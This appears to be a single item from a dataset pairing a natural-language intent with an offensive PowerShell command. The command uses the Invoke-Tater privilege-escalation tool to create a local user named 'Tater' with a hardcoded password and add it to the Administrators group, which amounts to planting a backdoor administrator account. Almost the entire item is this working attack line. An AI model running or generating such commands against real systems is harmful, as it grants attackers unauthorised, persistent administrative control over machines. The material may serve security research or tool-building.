# Natural language intent:
# Execute a command with Tater to add a user and add it to the administrators group using PowerShell.

Invoke-Tater -Command 'net user Tater Spring2016 /add && net localgroup administrators Tater /add'
